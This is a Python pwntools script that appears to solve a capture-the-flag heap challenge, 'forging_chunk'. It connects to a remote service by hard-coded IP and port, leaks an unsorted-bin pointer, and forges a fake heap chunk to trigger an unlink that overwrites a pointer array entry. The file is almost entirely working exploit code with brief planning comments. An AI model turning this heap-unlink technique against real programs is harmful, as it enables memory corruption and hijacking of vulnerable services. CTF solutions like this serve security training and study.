#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
#elf = ELF('./forging_chunk')

debug = 0

context.os='linux'

# need Ubuntu ???
# using tmux to run
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''
    c = process('./forging_chunk')
    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'
else:
    c = remote('140.110.112.77', 9002)
    context.log_level ='debug'


def select(menu_select, x):
    c.sendlineafter('input:', str(menu_select))
    c.sendlineafter('x = ', str(x))

def free(index):
    select(0, index)

def malloc(index):
    select(1, index)
    c.recvuntil('adr:')
    addr = int(c.recvline()[:-1], 16)
    print(hex(addr))
    return addr


def write(index, data):
    select(2, index)
    c.sendafter('string = ', data)

def show(index):
    select(3, index)

c.recvuntil("victim's address:");
victim_addr = int(c.recvline()[:-1], 16)
print(hex(victim_addr))

c.recvuntil("size's address:");
size_addr = int(c.recvline()[:-1], 16)
print(hex(size_addr))

c.recvuntil("ary\'s adr:");
ary_addr = int(c.recvline()[:-1], 16)
print(hex(size_addr))

def leak_unsort_bin():
    malloc(2)
    malloc(3)
    free(2)
    free(3)
    malloc(2)
    show(2)
    c.recvuntil('string:\n')
    bin_addr = u64(c.recvline()[:-1] + b'\0\0')
    print(hex(bin_addr))
    return bin_addr

def leak_small_bin():
    assert(False) # this function not working
    malloc(0)
    free(0)
    malloc(0)
    show(0)
    c.recvuntil('string:\n')
    bin_addr = u64(c.recvline()[:-1] + b'\0\0')
    print(hex(bin_addr))
    return bin_addr

unsort_bin_addr = leak_unsort_bin()

# &(fake_chunk->pre_size) = &(fake_chunk->pre_size) - 8
fake_chunk_addr = size_addr - 8

# fake chunk, we want write ary[0] pointing to victim
# maybe using unlink to write ary[0]
"""
pre size: ????
size's address:0x7ffd9d90b5b0
fd = victim's address:0x7ffd9d90b5b8
bk = &ary[0] :0x7ffd9d90b5c0
"""
# and fake chunk is
"""
pre size ????
size = 0x20
fd = 1337
bk = &(unlink_chunk->pre_size)
"""

# we want unlink this chunk
# and we want change fakechunk->bk to it self 
# modify bk must be the forward
"""
pre size ????
size = ?
fd = &(fake_chunk->pre_size)
bk = &(fake_chunk->pre_size + 8)
"""

# but unlink_chunk->start is &(unlink_chunk->data) - 0x10 = &(unlink_chunk->pre_size)
# so we need forge another chunk to make ary[0] = &(unlink_chunk->pre_size)


unlink_chunk = malloc(0)
q = malloc(2)
write(0,  p64(0x90) + p64(0x80) + flat(p64(fake_chunk_addr) + p64(fake_chunk_addr + 0x8), length=0x70) + p64(q - 0x10 - unlink_chunk) + p64(0x90))
free(2)

write(0,  p64(0xdeadbeef) * 4)


c.sendlineafter('input:', str(10))

c.interactive()
c.close()

